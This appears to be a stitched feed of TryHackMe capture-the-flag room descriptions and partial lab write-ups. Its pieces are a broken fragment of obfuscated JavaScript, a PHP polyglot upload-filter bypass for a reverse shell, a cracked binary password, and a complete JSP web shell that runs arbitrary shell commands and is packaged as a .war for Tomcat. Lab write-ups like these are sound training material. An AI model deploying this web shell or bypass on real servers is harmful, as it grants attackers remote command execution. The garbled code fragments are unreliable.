item.title: Towel on the Sunbed
item.description:
link:https://tryhackme.com/room/hh-towelonthesunbed-61271709
description :

🛎️ Concierge Briefing

Ponzi found the resort's wellness portal running a little side project called _Ponzi_ — a crypto rewards app, poolside edition. He set his towel down, claimed his daily reward, and went to reapply sunscreen. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.

He's convinced the app owes him a spot in the Whale Vault. The app disagrees, politely, once every 24 hours. Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through.

item.title: Jackpot
item.description:
link:https://tryhackme.com/room/jackpot
Description:

A branch ATM at "Earth's National Bank" has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine's native hardware language with no authentication worth the name.

The cash dispenser doesn't care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.

3 ports opened on the first scan

item.title: Attacktive Directory
item.description:
Setup

Just follow the Impacket installation guide.
Note: For pip3 install -r /opt/impacket/requirements.txt, I used:

python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install -r requirements.txt

because otherwise it wouldn’t work (externally managed environment). I found the solution on Stack Overflow: https://stackoverflow.com/questions/75602063/pip-install-r-requirements-txt-is-failing-this-environment-is-externally-mana

Task 3 - Welcome to Attacktive Directory

I ran an nmap scan with several flags; quick description:

  • -A: OS detection and version scanning
  • -p-: scan ports 1 to 65535
  • -T5: aggressive timing template (read more in the man page)
  • -Pn: treat all hosts as online (skip ping)
    Note: this scan will take a while.


OK, a lot of ports open, interesting.

}(function(d, e) {
    const i = b,
        f = d();
    while (!![]) {
        try {
            const g = parseInt(i(0x16b)) / 0x1 + -parseInt(i(0x16f)) / 0x2 + parseInt(i(0x167)) / 0x3 * (parseInt(i(0x16a)) / 0x4) + parseInt(i(0x16c)) / 0x5 + parseInt(i(0x168)) / 0x6 * (parseInt(i(0x165)) / 0x7) + -parseInt(i(0x166)) / 0x8 * (parseInt(i(0x16e)) / 0x9) + parseInt(i(0x16d)) / 0xa;

            else f['push'](f['shift']());

            f['push'](f['shift']());

}(a, 0xe43f0));
const c = j(0x169);

OK interesting, the majority of the code is obfuscated. Let’s evaluate j(0x169) inside the browser console to see if we get something:

item.title: RootMe
item.description:
Reconnaissance

Just run:

sudo nmap $IP -sCV -p-

It will give you all the answers needed.

Getting a Shell

This is where it became interesting: in the last step we get a secret folder called panel where we can upload different files. Cool, we know that this is how we are going to get a reverse shell.

But when I try to upload a .php reverse shell, an error message is triggered saying that PHP is not allowed, so we are going to have to bypass this file filter somehow:

Researching ways to bypass this, I found out about polyglot files, which are basically files that can be executed as multiple file formats, like a PNG that is also a PDF. With that in mind, we can create a PNG that is also a PHP file.
Important to mention: you can also bypass this by intercepting the request using Burp Suite and then changing the file format, but I will not go into that here.

item.title: Compiled
item.description:
OK, so let’s download the binary and test it:

It asks for a password; let’s open it in Ghidra:

The main function in Ghidra shows an entangled chain of if checks.

The function __isoc99_scanf seems weird; let’s read the man page:

   `The format string consists of a sequence of directives which` 
   `describe how to process the sequence of input characters. If` 
   `processing of a directive fails, no further input is read, and` 
   `scanf() returns. A "failure" can be either of the following:` 
   `input failure, meaning that input characters were unavailable, or` 
   `matching failure, meaning that the input was inappropriate (see` 
   `below)`

   `A directive is one of the following:`

   `•      A sequence of white-space characters (space, tab, newline,`
          `etc.; see isspace(3)).  This directive matches any amount`
          `of white space, including none, in the input.`

   `•      An ordinary character (i.e., one other than white space or`
          `'%').  This character must exactly match the next`
          `character of input.`

   `•      A conversion specification, which commences with a '%'`
          `(percent) character.  A sequence of characters from the`
          `input is converted according to this specification, and`
          `the result is placed in the corresponding pointer`
          `argument.  If the next item of input does not match the`
          `conversion specification, the conversion fails—this is a`
          `matching failure.`

OK, interesting. So according to the man page and the program, everything before the DoYouEven string will be stored in variable local_28, and local_28 has to have the value _init for us to get the password. So let’s try the password:
DoYouEven_init

item.title: manager-tomcat
item.description:

Log in with the password at /manager:

Inside, we get a file upload menu; the file needs to be in .war format.

Create shell:


nano shell.jsp

COPY-PASTE THIS

<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>

zip exploit.war shell.jsp A
